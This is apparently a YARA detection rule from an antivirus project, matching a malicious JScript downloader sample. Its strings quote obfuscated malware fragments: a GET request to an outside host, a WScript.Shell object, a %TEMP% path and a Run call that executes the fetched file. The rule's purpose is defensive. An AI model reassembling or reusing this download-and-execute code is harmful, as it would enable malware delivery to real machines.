rule sig_20160427_193341695b2d874aa33d71aec1795b1f {
  meta:
    description = "datamaliciousorder - file 20160427_193341695b2d874aa33d71aec1795b1f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "2e5f70f9e1159eb9b039095430ed9678dffae63d98de7845b11ac7830c15f431"

  strings:
    $s1  = "CkxndCkoea[XbnhaDgyhg](\"G\" + \"ET\", \"http://soccerinsider.net/mys3ks\", false);" fullword ascii
    $s2  = "function LmimlEyrvk() {return KhanlLysor[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"FOvlzBC" ascii
    $s3  = "function LmimlEyrvk() {return KhanlLysor[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"FOvlzBC" ascii
    $s4  = "function IbtvaIixim(QgihwSgsdn, XhijaUhzfk){JymtaJoyyg = JymtaJoyyg * 1; return QgihwSgsdn - XhijaUhzfk;};" fullword ascii
    $s5  = "var KhanlLysor = function SrccuBwgvq() {return BkcqgTqdvn[ZeklgPxkdj](\"WScript\"+\".Shell\");}(), NkspcPcqud = 11;" fullword ascii
    $s6  = "var BkcqgTqdvn = this[\"WScript\"];" fullword ascii
    $s7  = "if (CkxndCkoea[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function FdthiEcpta(){return ImwpyFsykc + \"\";};" fullword ascii
    $s9  = "function ZkzlyAnbtw() {return ((MyhqwXfdrh == true) && (MyhqwXfdrh == WzbwuUozod)) ? 1 : JymtaJoyyg;};" fullword ascii
    $s10 = "}while (IvyhfMuzdx);" fullword ascii
    $s11 = "function BzgqaKbfjq(KckqvPguna) {var EhtpwTtyfu = (1, 2, 3, 4, 5, KckqvPguna); return EhtpwTtyfu;};" fullword ascii
    $s12 = "var NveaiWjrqn = false;" fullword ascii
    $s13 = "WzbwuUozod = true; " fullword ascii
    $s14 = "function JfdevClizb(){return 23;};" fullword ascii
    $s15 = "function DccqtErfia(){return ZeklgPxkdj;};" fullword ascii
    $s16 = "function AwhtfZqhkg()" fullword ascii
    $s17 = "var KvtnmIxscf = new this[\"D\"+\"ate\"]();" fullword ascii
    $s18 = "NveaiWjrqn = true;" fullword ascii
    $s19 = "MyhqwXfdrh = true; " fullword ascii
    $s20 = "function EndirOqbbv(HxrucVibng){KhanlLysor[\"R\"+\"un\"](HxrucVibng, JymtaJoyyg, JymtaJoyyg);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}